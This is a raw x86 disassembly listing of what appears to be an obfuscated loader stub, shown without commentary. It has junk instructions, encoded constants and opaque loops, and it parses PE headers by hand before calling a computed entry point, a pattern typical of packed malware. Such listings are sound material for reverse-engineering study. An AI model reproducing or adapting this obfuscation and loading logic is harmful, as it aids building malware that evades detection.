  4094e4:	cmp    DWORD PTR ds:0x42ee2c,0x0
  4094eb:	je     0x409533
  4094f1:	cmp    DWORD PTR ds:0x42ee2c,0x27
  4094f8:	jne    0x40950c
  4094fe:	push   DWORD PTR [ebp-0x20]
  409501:	push   0x215b
  409506:	call   DWORD PTR ds:0x42ebb8
  40950c:	xor    edi,edi
  40950e:	xor    edi,DWORD PTR ds:0x42ee2c
  409514:	dec    edi
  409515:	mov    DWORD PTR ds:0x42ee2c,edi
  40951b:	jmp    0x4094e4
  409520:	movzx  edi,BYTE PTR ds:0x42e76a
  409527:	or     edi,DWORD PTR ds:0x43053e
  40952d:	mov    DWORD PTR ds:0x42e76a,edi
  409533:	xor    eax,esi
  409535:	xor    edi,0xc6b
  40953b:	add    eax,0x32729d
  409540:	mov    DWORD PTR [ecx],eax
  409542:	mov    eax,ds:0x41227c
  409547:	sbb    DWORD PTR ds:0x4304a2,0x6967
  409551:	mov    DWORD PTR [ebp-0x28],0x8e12febc
  409558:	mov    edi,DWORD PTR ds:0x43049a
  40955e:	sbb    DWORD PTR ds:0x42ee0c,edi
  409564:	mov    eax,DWORD PTR [eax]
  409566:	mov    DWORD PTR ds:0x42ee24,0x19
  409570:	cmp    DWORD PTR ds:0x42ee24,0x0
  409577:	je     0x40961e
  40957d:	cmp    DWORD PTR ds:0x42ee24,0x29
  409584:	jne    0x4095c1
  40958a:	push   DWORD PTR [ebp-0xc]
  40958d:	push   DWORD PTR [ebp-0x1c]
  409590:	push   0x61da
  409595:	push   DWORD PTR [ebp-0xc]
  409598:	push   DWORD PTR [ebp-0x1c]
  40959b:	push   DWORD PTR [ebp-0x20]
  40959e:	push   DWORD PTR [ebp-0x1c]
  4095a1:	push   DWORD PTR [ebp-0x28]
  4095a4:	push   0x400000
  4095a9:	push   DWORD PTR [ebp-0xc]
  4095ac:	push   0x2e1f
  4095b1:	push   0x5a6c
  4095b6:	push   0x7112
  4095bb:	call   DWORD PTR ds:0x42eab8
  4095c1:	xor    edi,edi
  4095c3:	xor    edi,DWORD PTR ds:0x42ee24
  4095c9:	dec    edi
  4095ca:	mov    DWORD PTR ds:0x42ee24,edi
  4095d0:	jmp    0x409570
  4095d5:	and    DWORD PTR ds:0x42e75e,0x0
  4095df:	jmp    0x4095f1
  4095e4:	mov    edi,DWORD PTR ds:0x42e75e
  4095ea:	inc    edi
  4095eb:	mov    DWORD PTR ds:0x42e75e,edi
  4095f1:	cmp    DWORD PTR ds:0x42e75e,0x18
  4095f8:	jae    0x40961e
  4095fe:	cmp    DWORD PTR ds:0x42e75e,0x1f
  409605:	jne    0x409619
  40960b:	push   0x6de3
  409610:	push   DWORD PTR [ebp-0x28]
  409613:	call   DWORD PTR ds:0x42ebbc
  409619:	jmp    0x4095e4
  40961e:	mov    cx,WORD PTR [ebp-0x14]
  409622:	movzx  ecx,cx
  409625:	add    ecx,DWORD PTR [eax]
  409627:	xor    eax,eax
  409629:	mov    DWORD PTR [ebp-0x34],0xf89c8531
  409630:	mov    DWORD PTR [ebp-0x10],ecx
  409633:	mov    edi,0x5a3fc9c
  409638:	add    DWORD PTR ds:0x42e762,edx
  40963e:	mov    eax,DWORD PTR [ebp-0x1c]
  409641:	xor    ecx,ecx
  409643:	xor    ecx,DWORD PTR ds:0x4304a2
  409649:	sub    DWORD PTR ds:0x43048a,ecx
  40964f:	mov    ecx,DWORD PTR [ebp-0xc]
  409652:	or     DWORD PTR ds:0x42ee2c,0x4304a2
  40965c:	xor    eax,esi
  40965e:	mov    DWORD PTR ds:0x4304aa,0x4c41
  409668:	add    eax,ebx
  40966a:	mov    DWORD PTR ds:0x42e76e,0x490b
  409674:	cmp    DWORD PTR [ecx],eax
  409676:	jne    0x409a49
  40967c:	mov    DWORD PTR ds:0x42e75e,0x1f
  409686:	cmp    DWORD PTR ds:0x42e75e,0x0
  40968d:	je     0x40972a
  409693:	cmp    DWORD PTR ds:0x42e75e,0xb
  40969a:	jne    0x4096b3
  4096a0:	push   DWORD PTR [ebp-0xc]
  4096a3:	push   0x6e82
  4096a8:	push   0x1d82
  4096ad:	call   DWORD PTR ds:0x42ead4
  4096b3:	cmp    DWORD PTR ds:0x42e75e,0xc
  4096ba:	jne    0x4096cb
  4096c0:	mov    eax,ds:0x42e75e
  4096c5:	dec    eax
  4096c6:	mov    ds:0x42e75e,eax
  4096cb:	mov    eax,ds:0x42e75e
  4096d0:	dec    eax
  4096d1:	mov    ds:0x42e75e,eax
  4096d6:	jmp    0x409686
  4096db:	and    DWORD PTR ds:0x42ee24,0x0
  4096e5:	jmp    0x4096f7
  4096ea:	mov    ecx,DWORD PTR ds:0x42ee24
  4096f0:	inc    ecx
  4096f1:	mov    DWORD PTR ds:0x42ee24,ecx
  4096f7:	cmp    DWORD PTR ds:0x42ee24,0x11
  4096fe:	jae    0x40972a
  409704:	cmp    DWORD PTR ds:0x42ee24,0x1a
  40970b:	jne    0x40971f
  409711:	push   0x430492
  409716:	push   DWORD PTR [ebp-0x1c]
  409719:	call   DWORD PTR ds:0x42ebc0
  40971f:	jmp    0x4096ea
  409724:	or     ecx,DWORD PTR ds:0x43048a
  40972a:	mov    eax,DWORD PTR [ebp-0x1c]
  40972d:	mov    DWORD PTR ds:0x42ee14,0x1a
  409737:	cmp    DWORD PTR ds:0x42ee14,0x0
  40973e:	je     0x40977d
  409744:	cmp    DWORD PTR ds:0x42ee14,0x29
  40974b:	jne    0x409769
  409751:	push   0x6cb7
  409756:	push   DWORD PTR [ebp-0x20]
  409759:	push   0x3e46
  40975e:	push   0x42ee2c
  409763:	call   DWORD PTR ds:0x42ebc4
  409769:	xor    ecx,ecx
  40976b:	or     ecx,DWORD PTR ds:0x42ee14
  409771:	dec    ecx
  409772:	mov    DWORD PTR ds:0x42ee14,ecx
  409778:	jmp    0x409737
  40977d:	mov    ecx,DWORD PTR [ebp-0x10]
  409780:	xor    eax,esi
  409782:	adc    DWORD PTR ds:0x4304ae,0x39c3
  40978c:	add    eax,ebx
  40978e:	mov    DWORD PTR ds:0x43054e,0x5e01
  409798:	cmp    DWORD PTR [ecx],eax
  40979a:	jne    0x4098a3
  4097a0:	xor    ecx,ecx
  4097a2:	add    ecx,DWORD PTR ds:0x42ee18
  4097a8:	sub    DWORD PTR ds:0x42e762,ecx
  4097ae:	mov    eax,DWORD PTR [ebp-0x1c]
  4097b1:	xor    ecx,ecx
  4097b3:	mov    ecx,DWORD PTR [ebp-0x44]
  4097b6:	inc    DWORD PTR ds:0x430546
  4097bc:	xor    eax,esi
  4097be:	and    DWORD PTR ds:0x42e75a,0x0
  4097c8:	mov    edx,DWORD PTR ds:0x42e75a
  4097ce:	inc    edx
  4097cf:	mov    DWORD PTR ds:0x42e75a,edx
  4097d5:	cmp    DWORD PTR ds:0x42e75a,0x11
  4097dc:	jne    0x4097f0
  4097e2:	push   0x430556
  4097e7:	push   DWORD PTR [ebp-0x10]
  4097ea:	call   DWORD PTR ds:0x42ead8
  4097f0:	cmp    DWORD PTR ds:0x42e75a,0x10
  4097f7:	jne    0x40980a
  4097fd:	mov    edx,DWORD PTR ds:0x42e75a
  409803:	inc    edx
  409804:	mov    DWORD PTR ds:0x42e75a,edx
  40980a:	cmp    DWORD PTR ds:0x42e75a,0x1c
  409811:	jb     0x4097c8
  409817:	add    eax,ebx
  409819:	sbb    edx,0x5b8
  40981f:	mov    DWORD PTR [ecx],eax
  409821:	mov    DWORD PTR ds:0x430542,0x1c
  40982b:	cmp    DWORD PTR ds:0x430542,0x0
  409832:	je     0x40987c
  409838:	cmp    DWORD PTR ds:0x430542,0xd
  40983f:	jne    0x409850
  409845:	push   0x4366
  40984a:	call   DWORD PTR ds:0x42ebc8
  409850:	cmp    DWORD PTR ds:0x430542,0xe
  409857:	jne    0x40986a
  40985d:	mov    edx,DWORD PTR ds:0x430542
  409863:	dec    edx
  409864:	mov    DWORD PTR ds:0x430542,edx
  40986a:	mov    edx,DWORD PTR ds:0x430542
  409870:	dec    edx
  409871:	mov    DWORD PTR ds:0x430542,edx
  409877:	jmp    0x40982b
  40987c:	mov    eax,DWORD PTR [ebp-0x44]
  40987f:	mov    ecx,DWORD PTR [ebp-0x34]
  409882:	adc    DWORD PTR ds:0x42ee14,ebx
  409888:	xor    ecx,esi
  40988a:	xor    DWORD PTR ds:0x43054a,edi
  409890:	mov    edx,0xffcd8d63
  409895:	and    DWORD PTR ds:0x4304a2,0x42e772
  40989f:	sub    edx,ecx
  4098a1:	add    DWORD PTR [eax],edx
  4098a3:	and    DWORD PTR ds:0x4304ba,0x0
  4098ad:	jmp    0x4098bd
  4098b2:	mov    eax,ds:0x4304ba
  4098b7:	inc    eax
  4098b8:	mov    ds:0x4304ba,eax
  4098bd:	cmp    DWORD PTR ds:0x4304ba,0x11
  4098c4:	jae    0x40990a
  4098ca:	cmp    DWORD PTR ds:0x4304ba,0xb
  4098d1:	jne    0x4098eb
  4098d7:	push   DWORD PTR [ebp-0x14]
  4098da:	push   DWORD PTR [ebp-0x10]
  4098dd:	push   0x45e3
  4098e2:	push   DWORD PTR [ebp-0x1c]
  4098e5:	call   DWORD PTR ds:0x42ebcc
  4098eb:	cmp    DWORD PTR ds:0x4304ba,0xa
  4098f2:	jne    0x409903
  4098f8:	mov    eax,ds:0x4304ba
  4098fd:	inc    eax
  4098fe:	mov    ds:0x4304ba,eax
  409903:	jmp    0x4098b2
  409908:	not    eax
  40990a:	mov    eax,ds:0x41227c
  40990f:	mov    eax,DWORD PTR [eax]
  409911:	sub    DWORD PTR ds:0x4304c2,0x4304a6
  40991b:	mov    cx,WORD PTR [ebp-0x14]
  40991f:	and    DWORD PTR ds:0x42ee1c,0x42e76e
  409929:	movzx  ecx,cx
  40992c:	add    ecx,DWORD PTR [eax]
  40992e:	and    DWORD PTR ds:0x42ee14,0x0
  409938:	jmp    0x40994b
  40993d:	xor    eax,eax
  40993f:	add    eax,DWORD PTR ds:0x42ee14
  409945:	inc    eax
  409946:	mov    ds:0x42ee14,eax
  40994b:	cmp    DWORD PTR ds:0x42ee14,0x1d
  409952:	jae    0x409980
  409958:	cmp    DWORD PTR ds:0x42ee14,0x1f
  40995f:	jne    0x409975
  409965:	push   0x887a
  40996a:	push   0x3c32
  40996f:	call   DWORD PTR ds:0x42eae0
  409975:	jmp    0x40993d
  40997a:	adc    eax,DWORD PTR ds:0x43049e
  409980:	mov    DWORD PTR [ebp-0x10],ecx
  409983:	sub    DWORD PTR ds:0x42e75e,0x488b
  40998d:	mov    eax,DWORD PTR [ebp-0x30]
  409990:	xor    ecx,ecx
  409992:	add    ecx,DWORD PTR ds:0x4304c2
  409998:	xor    ecx,DWORD PTR ds:0x4304be
  40999e:	mov    DWORD PTR ds:0x4304c2,ecx
  4099a4:	mov    ecx,DWORD PTR [ebp-0x30]
  4099a7:	xor    eax,esi
  4099a9:	sbb    DWORD PTR ds:0x4304b6,0x42ee14
  4099b3:	add    eax,eax
  4099b5:	and    DWORD PTR ds:0x42e76a,0x42ee08
  4099bf:	xor    ecx,esi
  4099c1:	sub    DWORD PTR ds:0x4304ba,0x1a55
  4099cb:	sub    ecx,eax
  4099cd:	or     DWORD PTR ds:0x4304b2,0x4304c2
  4099d7:	mov    ax,WORD PTR [ebp-0x14]
  4099db:	sub    DWORD PTR ds:0x42e75e,0x42e76a
  4099e5:	movzx  eax,ax
  4099e8:	sub    ecx,ebx
  4099ea:	mov    DWORD PTR ds:0x42e772,0x4be2
  4099f4:	cmp    eax,ecx
  4099f6:	mov    DWORD PTR ds:0x430546,0x6841
  409a00:	mov    eax,DWORD PTR [ebp-0x34]
  409a03:	movzx  ecx,WORD PTR [ebp-0x14]
  409a07:	mov    DWORD PTR ds:0x42e75a,0x46e
  409a11:	jg     0x409a30
  409a17:	xor    eax,esi
  409a19:	sub    ecx,eax
  409a1b:	adc    DWORD PTR ds:0x430486,0x430552
  409a25:	sub    ecx,ebx
  409a27:	mov    WORD PTR [ebp-0x14],cx
  409a2b:	jmp    0x409a49
  409a30:	not    DWORD PTR ds:0x42e75e
  409a36:	xor    eax,esi
  409a38:	lea    eax,[eax+ecx*1+0x32729d]
  409a3f:	mov    DWORD PTR ds:0x43055a,ebx
  409a45:	mov    WORD PTR [ebp-0x14],ax
  409a49:	mov    ecx,DWORD PTR [ebp-0x28]
  409a4c:	not    eax
  409a4e:	mov    eax,0x8e12febc
  409a53:	mov    DWORD PTR ds:0x42e76e,0x41a
  409a5d:	cmp    ecx,eax
  409a5f:	mov    DWORD PTR ds:0x42e76e,0x60ce
  409a69:	je     0x409a9b
  409a6f:	mov    DWORD PTR ds:0x42ee10,0x7d2b
  409a79:	mov    eax,DWORD PTR [ebp-0xc]
  409a7c:	mov    DWORD PTR ds:0x43049a,0x4b8f
  409a86:	mov    DWORD PTR [eax],0x60341e8d
  409a8c:	mov    DWORD PTR ds:0x42e75e,0x3193
  409a96:	jmp    0x409daf
  409a9b:	mov    ecx,DWORD PTR [ebp-0x28]
  409a9e:	cmp    ecx,0x5142ddba
  409aa4:	jne    0x409bad
  409aaa:	mov    DWORD PTR ds:0x43054e,ecx
  409ab0:	mov    eax,DWORD PTR [ebp-0xc]
  409ab3:	mov    DWORD PTR ds:0x4304be,0x644d
  409abd:	mov    DWORD PTR [eax],0x4214feba
  409ac3:	mov    eax,DWORD PTR [ebp-0xc]
  409ac6:	mov    DWORD PTR ds:0x43055a,0x1ed6
  409ad0:	mov    DWORD PTR [ebp-0x4],eax
  409ad3:	mov    DWORD PTR ds:0x43054a,edx
  409ad9:	mov    eax,DWORD PTR [ebp-0x30]
  409adc:	mov    eax,DWORD PTR [ebp-0x1c]
  409adf:	mov    DWORD PTR [ebp-0x4c],edi
  409ae2:	mov    eax,0xff7
  409ae7:	mov    eax,DWORD PTR [ebp-0x4c]
  409aea:	mov    DWORD PTR [ebp-0x8],0x4eb9
  409af1:	cmp    eax,edi
  409af3:	mov    DWORD PTR ds:0x430552,0x7826
  409afd:	jne    0x409daf
  409b03:	add    DWORD PTR ds:0x42ee0c,0x42e75e
  409b0d:	mov    ax,WORD PTR [ebp-0x8]
  409b11:	sbb    ecx,DWORD PTR ds:0x4304ba
  409b17:	mov    ecx,0x8a40
  409b1c:	xor    ax,cx
  409b1f:	xor    ecx,DWORD PTR ds:0x42ee0c
  409b25:	mov    ecx,0x3b06
  409b2a:	add    ax,cx
  409b2d:	mov    ecx,DWORD PTR [ebp-0x4]
  409b30:	movzx  eax,ax
  409b33:	sub    DWORD PTR ds:0x430546,0x42ee28
  409b3d:	not    eax
  409b3f:	sbb    DWORD PTR ds:0x42e76a,0x43049a
  409b49:	and    eax,DWORD PTR [ecx]
  409b4b:	mov    ecx,DWORD PTR [ebp-0x4]
  409b4e:	mov    DWORD PTR ds:0x4304aa,0x2700
  409b58:	mov    DWORD PTR [ecx],eax
  409b5a:	jmp    0x409b70
  409b5f:	and    DWORD PTR ds:0x42e75e,0x43054e
  409b69:	xor    DWORD PTR [ebp-0x4c],0xe149ebc
  409b70:	mov    ax,WORD PTR [ebp-0x8]
  409b74:	not    DWORD PTR ds:0x4304c2
  409b7a:	push   DWORD PTR [ebp-0x4]
  409b7d:	adc    DWORD PTR ds:0x42ee28,0x430496
  409b87:	call   0x401000
  409b8c:	xor    DWORD PTR ds:0x42ee24,0x7536
  409b96:	test   eax,eax
  409b98:	mov    DWORD PTR ds:0x430486,0x7cfd
  409ba2:	je     0x409b5f
  409ba8:	jmp    0x409daf
  409bad:	movzx  ecx,WORD PTR ds:0x430496
  409bb4:	mov    ecx,DWORD PTR [ebp-0x28]
  409bb7:	cmp    ecx,0x1443fcbd
  409bbd:	jne    0x409bef
  409bc3:	mov    DWORD PTR ds:0x4304a2,0x6608
  409bcd:	mov    eax,DWORD PTR [ebp-0xc]
  409bd0:	mov    DWORD PTR ds:0x43048e,0x8ce
  409bda:	mov    DWORD PTR [eax],0x60062d8f
  409be0:	mov    DWORD PTR ds:0x4304ba,0x323c
  409bea:	jmp    0x409daf
  409bef:	mov    DWORD PTR ds:0x4304a2,0x6595
  409bf9:	mov    ecx,DWORD PTR [ebp-0x28]
  409bfc:	mov    DWORD PTR ds:0x42e776,0x5912
  409c06:	cmp    ecx,eax
  409c08:	jne    0x409d34
  409c0e:	sbb    DWORD PTR ds:0x4304be,edx
  409c14:	mov    eax,DWORD PTR [ebp-0x1c]
  409c17:	and    DWORD PTR ds:0x430542,0x28ff
  409c21:	mov    ecx,DWORD PTR [ebp-0xc]
  409c24:	mov    DWORD PTR ds:0x430546,0x5e2a
  409c2e:	xor    eax,esi
  409c30:	xor    DWORD PTR ds:0x430546,0x42ee0c
  409c3a:	add    eax,ebx
  409c3c:	cmp    DWORD PTR [ecx],eax
  409c3e:	je     0x409cc1
  409c44:	mov    ecx,DWORD PTR [ebp-0x54]
  409c47:	mov    eax,DWORD PTR [ebp-0xc]
  409c4a:	mov    eax,DWORD PTR [eax]
  409c4c:	mov    eax,DWORD PTR [eax+0x3c]
  409c4f:	lea    ecx,[ecx*8+0x78]
  409c56:	add    eax,ecx
  409c58:	mov    ecx,DWORD PTR [ebp-0xc]
  409c5b:	mov    ecx,DWORD PTR [ecx]
  409c5d:	mov    eax,DWORD PTR [eax+ecx*1]
  409c60:	mov    DWORD PTR [ebp-0x8],eax
  409c63:	mov    eax,DWORD PTR [ebp-0x1c]
  409c66:	xor    eax,esi
  409c68:	add    eax,ebx
  409c6a:	mov    DWORD PTR [ebp-0x4],eax
  409c6d:	mov    eax,DWORD PTR [ebp-0x1c]
  409c70:	mov    ecx,DWORD PTR [ebp-0x8]
  409c73:	xor    eax,esi
  409c75:	add    eax,ebx
  409c77:	cmp    ecx,eax
  409c79:	je     0x409daf
  409c7f:	mov    eax,DWORD PTR [ebp-0xc]
  409c82:	mov    ecx,DWORD PTR [ebp-0x8]
  409c85:	add    ecx,DWORD PTR [eax]
  409c87:	mov    DWORD PTR [ebp-0x4],ecx
  409c8a:	mov    eax,DWORD PTR [ebp-0x4]
  409c8d:	mov    ecx,DWORD PTR [ebp-0xc]
  409c90:	mov    eax,DWORD PTR [eax+0xc]
  409c93:	mov    ecx,DWORD PTR [ecx]
  409c95:	mov    al,BYTE PTR [eax+ecx*1]
  409c98:	add    al,0x36
  409c9a:	xor    al,0x48
  409c9c:	cmp    al,0xc9
  409c9e:	je     0x409cb5
  409ca4:	mov    eax,DWORD PTR [ebp-0x1c]
  409ca7:	mov    ecx,DWORD PTR [ebp-0xc]
  409caa:	xor    eax,esi
  409cac:	add    eax,ebx
  409cae:	mov    DWORD PTR [ecx],eax
  409cb0:	jmp    0x409daf
  409cb5:	xor    DWORD PTR [ebp-0x28],0x5fd8f
  409cbc:	jmp    0x409daf
  409cc1:	mov    eax,DWORD PTR [ebp-0xc]
  409cc4:	mov    ecx,DWORD PTR [ebp-0x10]
  409cc7:	mov    ecx,DWORD PTR [ecx]
  409cc9:	mov    DWORD PTR [eax],ecx
  409ccb:	mov    eax,DWORD PTR [ebp-0xc]
  409cce:	mov    DWORD PTR [ebp-0x4],eax
  409cd1:	mov    eax,DWORD PTR [ebp-0x30]
  409cd4:	mov    eax,DWORD PTR [ebp-0x1c]
  409cd7:	mov    DWORD PTR [ebp-0x5c],edi
  409cda:	mov    eax,DWORD PTR [ebp-0x5c]
  409cdd:	mov    DWORD PTR [ebp-0x8],0x4eb9
  409ce4:	cmp    eax,edi
  409ce6:	jne    0x409daf
  409cec:	mov    ax,WORD PTR [ebp-0x8]
  409cf0:	mov    ecx,0x8a40
  409cf5:	xor    ax,cx
  409cf8:	mov    ecx,0x3b06
  409cfd:	add    ax,cx
  409d00:	mov    ecx,DWORD PTR [ebp-0x4]
  409d03:	movzx  eax,ax
  409d06:	not    eax
  409d08:	and    eax,DWORD PTR [ecx]
  409d0a:	mov    ecx,DWORD PTR [ebp-0x4]
  409d0d:	mov    DWORD PTR [ecx],eax
  409d0f:	jmp    0x409d1b
  409d14:	xor    DWORD PTR [ebp-0x5c],0xe149ebc
  409d1b:	mov    ax,WORD PTR [ebp-0x8]
  409d1f:	push   DWORD PTR [ebp-0x4]
  409d22:	call   0x401000
  409d27:	test   eax,eax
  409d29:	je     0x409d14
  409d2f:	jmp    0x409daf
  409d34:	mov    eax,DWORD PTR [ebp-0x28]
  409d37:	cmp    eax,0x33450cad
  409d3c:	jne    0x409daf
  409d42:	mov    eax,DWORD PTR [ebp-0xc]
  409d45:	mov    DWORD PTR [eax],0x443dc9d
  409d4b:	mov    eax,DWORD PTR [ebp-0xc]
  409d4e:	mov    DWORD PTR [ebp-0x4],eax
  409d51:	mov    eax,DWORD PTR [ebp-0x30]
  409d54:	mov    eax,DWORD PTR [ebp-0x1c]
  409d57:	mov    DWORD PTR [ebp-0x40],edi
  409d5a:	mov    eax,DWORD PTR [ebp-0x40]
  409d5d:	mov    DWORD PTR [ebp-0x8],0x4eb9
  409d64:	cmp    eax,edi
  409d66:	jne    0x409daf
  409d6c:	mov    ax,WORD PTR [ebp-0x8]
  409d70:	mov    ecx,0x8a40
  409d75:	xor    ax,cx
  409d78:	mov    ecx,0x3b06
  409d7d:	add    ax,cx
  409d80:	mov    ecx,DWORD PTR [ebp-0x4]
  409d83:	movzx  eax,ax
  409d86:	not    eax
  409d88:	and    eax,DWORD PTR [ecx]
  409d8a:	mov    ecx,DWORD PTR [ebp-0x4]
  409d8d:	mov    DWORD PTR [ecx],eax
  409d8f:	jmp    0x409d9b
  409d94:	xor    DWORD PTR [ebp-0x40],0xe149ebc
  409d9b:	mov    ax,WORD PTR [ebp-0x8]
  409d9f:	push   DWORD PTR [ebp-0x4]
  409da2:	call   0x401000
  409da7:	test   eax,eax
  409da9:	je     0x409d94
  409daf:	mov    eax,DWORD PTR [ebp-0x28]
  409db2:	cmp    eax,0x8e12febc
  409db7:	je     0x409638
  409dbd:	mov    eax,DWORD PTR [ebp-0xc]
  409dc0:	mov    eax,ds:0x4121a8
  409dc5:	mov    eax,DWORD PTR [eax+0x18c]
  409dcb:	mov    eax,DWORD PTR [eax]
  409dcd:	mov    DWORD PTR [ebp-0x74],eax
  409dd0:	mov    eax,0xf89c8531
  409dd5:	mov    DWORD PTR [ebp-0x10],eax
  409dd8:	mov    DWORD PTR [ebp-0x10],eax
  409ddb:	mov    DWORD PTR [ebp-0x10],eax
  409dde:	mov    DWORD PTR [ebp-0x10],0xf89c8535
  409de5:	mov    DWORD PTR [ebp-0x8],eax
  409de8:	mov    DWORD PTR [ebp-0x8],0xf89c853d
  409def:	mov    edi,DWORD PTR [ebp-0x20]
  409df2:	xor    edi,esi
  409df4:	add    edi,ebx
  409df6:	jmp    0x409e31
  409dfb:	mov    eax,DWORD PTR [ebp-0x18]
  409dfe:	xor    eax,esi
  409e00:	lea    eax,[eax+edi*1+0x32729d]
  409e07:	push   eax
  409e08:	mov    eax,DWORD PTR [ebp-0x10]
  409e0b:	xor    eax,esi
  409e0d:	lea    eax,[ebp+eax*1+0x3272a5]
  409e14:	push   eax
  409e15:	mov    eax,ds:0x4121a8
  409e1a:	push   DWORD PTR [eax+0x1bc]
  409e20:	call   0x4052e7
  409e25:	mov    eax,DWORD PTR [ebp-0x18]
  409e28:	xor    eax,esi
  409e2a:	lea    edi,[edi+eax*1+0x32729d]
  409e31:	mov    eax,DWORD PTR [ebp-0x18]
  409e34:	mov    ecx,DWORD PTR [ebp-0x18]
  409e37:	xor    ecx,esi
  409e39:	xor    eax,esi
  409e3b:	add    eax,ecx
  409e3d:	mov    ecx,DWORD PTR [ebp-0x18]
  409e40:	xor    ecx,esi
  409e42:	lea    eax,[eax+ecx*1+0x9757d7]
  409e49:	cmp    edi,eax
  409e4b:	jbe    0x409dfb
  409e51:	mov    eax,DWORD PTR [ebp+0xc]
  409e54:	mov    ds:0x41202c,eax
  409e59:	mov    eax,DWORD PTR [ebp+0x10]
  409e5c:	mov    ds:0x412280,eax
  409e61:	mov    eax,ds:0x41202c
  409e66:	mov    ecx,DWORD PTR [ebp-0x60]
  409e69:	sub    eax,ebx
  409e6b:	xor    eax,esi
  409e6d:	mov    DWORD PTR [ecx],eax
  409e6f:	mov    eax,DWORD PTR [ebp-0x58]
  409e72:	cmp    eax,0xf89c8532
  409e77:	je     0x409ed4
  409e7d:	mov    eax,DWORD PTR [ebp-0x20]
  409e80:	mov    ecx,DWORD PTR [ebp-0x50]
  409e83:	xor    eax,esi
  409e85:	add    eax,ebx
  409e87:	cmp    eax,ecx
  409e89:	je     0x409ed4
  409e8f:	mov    eax,ds:0x4121a8
  409e94:	mov    eax,DWORD PTR [eax+0x194]
  409e9a:	mov    ecx,DWORD PTR [eax]
  409e9c:	mov    eax,DWORD PTR [ecx+0x3c]
  409e9f:	push   DWORD PTR ds:0x412280
  409ea5:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  409ea9:	push   DWORD PTR ds:0x41202c
  409eaf:	add    eax,ecx
  409eb1:	mov    ecx,DWORD PTR ds:0x4121a8
  409eb7:	mov    ecx,DWORD PTR [ecx+0x194]
  409ebd:	push   DWORD PTR [ecx]
  409ebf:	call   eax
  409ec1:	mov    ecx,DWORD PTR ds:0x4121a8
  409ec7:	mov    ecx,DWORD PTR [ecx+0x1cc]
  409ecd:	mov    DWORD PTR [ecx],eax
  409ecf:	jmp    0x40a18e
  409ed4:	mov    eax,DWORD PTR [ebp-0x20]
  409ed7:	mov    ecx,DWORD PTR [ebp-0x74]
  409eda:	xor    eax,esi
  409edc:	add    eax,ebx
  409ede:	mov    edi,0xf89c85f5
  409ee3:	cmp    eax,ecx
  409ee5:	jne    0x409fe6
  409eeb:	mov    eax,DWORD PTR [ebp-0x20]
  409eee:	xor    eax,esi
  409ef0:	add    eax,ebx
  409ef2:	mov    ds:0x41222c,eax
  409ef7:	mov    eax,DWORD PTR [ebp-0x20]
  409efa:	xor    eax,esi
  409efc:	add    eax,ebx
  409efe:	mov    ds:0x412224,eax
  409f03:	mov    eax,DWORD PTR [ebp-0x18]
  409f06:	mov    DWORD PTR [ebp-0x8],eax
  409f09:	mov    eax,DWORD PTR [ebp-0x20]
  409f0c:	mov    DWORD PTR [ebp+0xc],eax
  409f0f:	mov    eax,DWORD PTR [ebp+0xc]
  409f12:	xor    eax,esi
  409f14:	add    eax,ebx
  409f16:	mov    DWORD PTR [ebp+0xc],eax
  409f19:	mov    eax,ds:0x412028
  409f1e:	mov    eax,DWORD PTR [eax]
  409f20:	mov    DWORD PTR [ebp+0xc],eax
  409f23:	mov    eax,ds:0x412230
  409f28:	mov    eax,DWORD PTR [eax]
  409f2a:	mov    DWORD PTR [ebp-0x60],eax
  409f2d:	mov    DWORD PTR [ebp+0x10],0xf89c8735
  409f34:	mov    eax,DWORD PTR [ebp+0x10]
  409f37:	xor    eax,esi
  409f39:	add    eax,ebx
  409f3b:	mov    DWORD PTR [ebp+0x10],eax
  409f3e:	mov    eax,ds:0x4121a8
  409f43:	mov    DWORD PTR [ebp+0x10],eax
  409f46:	mov    eax,DWORD PTR [ebp+0xc]
  409f49:	mov    DWORD PTR [ebp+0x10],eax
  409f4c:	mov    eax,DWORD PTR [ebp+0x10]
  409f4f:	push   0x4
  409f51:	pop    ecx
  409f52:	sub    ecx,eax
  409f54:	add    ecx,DWORD PTR [ebp-0x60]
  409f57:	mov    DWORD PTR [ebp-0x34],edi
  409f5a:	mov    DWORD PTR [ebp-0x10],ecx
  409f5d:	mov    DWORD PTR [ebp-0xc8],0xf89c8531
  409f67:	mov    eax,DWORD PTR [ebp+0x10]
  409f6a:	mov    DWORD PTR [ebp-0xc4],eax
  409f70:	mov    eax,DWORD PTR [ebp-0x10]
  409f73:	mov    DWORD PTR [ebp-0xc0],eax
  409f79:	mov    eax,DWORD PTR [ebp-0x34]
  409f7c:	xor    eax,esi
  409f7e:	add    eax,ebx
  409f80:	mov    DWORD PTR [ebp-0xbc],eax
  409f86:	lea    eax,[ebp-0x80]
  409f89:	mov    DWORD PTR [ebp-0xb8],eax
  409f8f:	mov    eax,DWORD PTR [ebp-0xc8]
  409f95:	xor    eax,esi
  409f97:	add    eax,ebx
  409f99:	mov    DWORD PTR [ebp-0xc8],eax
  409f9f:	lea    eax,[ebp-0xc8]
  409fa5:	push   eax
  409fa6:	mov    eax,DWORD PTR [ebp-0x8]
  409fa9:	xor    eax,esi
  409fab:	add    eax,ebx
  409fad:	push   eax
  409fae:	mov    eax,ds:0x4121c8
  409fb3:	push   0x41211e
  409fb8:	push   DWORD PTR [eax]
  409fba:	call   0x40b2c8
  409fbf:	and    DWORD PTR [ebp+0xc],0x0
  409fc3:	mov    eax,DWORD PTR [ebp-0x10]
  409fc6:	sub    eax,DWORD PTR [ebp+0xc]
  409fc9:	push   eax
  409fca:	mov    eax,DWORD PTR [ebp+0x10]
  409fcd:	add    eax,DWORD PTR [ebp+0xc]
  409fd0:	push   eax
  409fd1:	call   0x403861
  409fd6:	inc    DWORD PTR [ebp+0xc]
  409fd9:	cmp    DWORD PTR [ebp+0xc],0x52
  409fdd:	jb     0x409fc3
  409fe3:	mov    eax,DWORD PTR [ebp-0x8]
  409fe6:	mov    eax,ds:0x4121a8
  409feb:	mov    DWORD PTR [ebp+0x10],eax
  409fee:	mov    eax,ds:0x4122b4
  409ff3:	mov    DWORD PTR [ebp-0x68],eax
  409ff6:	mov    DWORD PTR [ebp+0xc],0xf89c8535
  409ffd:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40a004:	mov    eax,DWORD PTR [ebp+0xc]
  40a007:	xor    eax,esi
  40a009:	add    eax,ebx
  40a00b:	mov    DWORD PTR [ebp-0x7c],eax
  40a00e:	mov    DWORD PTR [ebp-0x70],0xf89cb535
  40a015:	mov    DWORD PTR [ebp-0x84],0xf89f0535
  40a01f:	mov    DWORD PTR [ebp-0x78],edi
